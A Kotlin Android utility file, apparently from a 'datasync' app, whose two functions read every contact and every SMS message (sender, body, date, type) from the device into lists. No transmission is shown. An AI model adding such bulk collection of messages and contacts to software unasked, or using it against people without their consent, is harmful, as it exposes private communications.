package com.datasync.user.utils

import android.annotation.SuppressLint
import android.content.Context
import android.provider.ContactsContract
import android.provider.Telephony
import com.datasync.user.model.Contact
import com.datasync.user.model.SMS

object DataHelper {

    @SuppressLint("Range")
    fun fetchContacts(context: Context): List<Contact> {
        val contacts = mutableListOf<Contact>()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phone = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contacts.add(Contact(name, phone, System.currentTimeMillis()))
            }
        }
        return contacts
    }

    @SuppressLint("Range")
    fun fetchSMS(context: Context): List<SMS> {
        val smsList = mutableListOf<SMS>()
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS)) ?: ""
                val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY)) ?: ""
                val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))
                val type = it.getInt(it.getColumnIndex(Telephony.Sms.TYPE))
                smsList.add(SMS(address, body, date, type))
            }
        }
        return smsList
    }
}
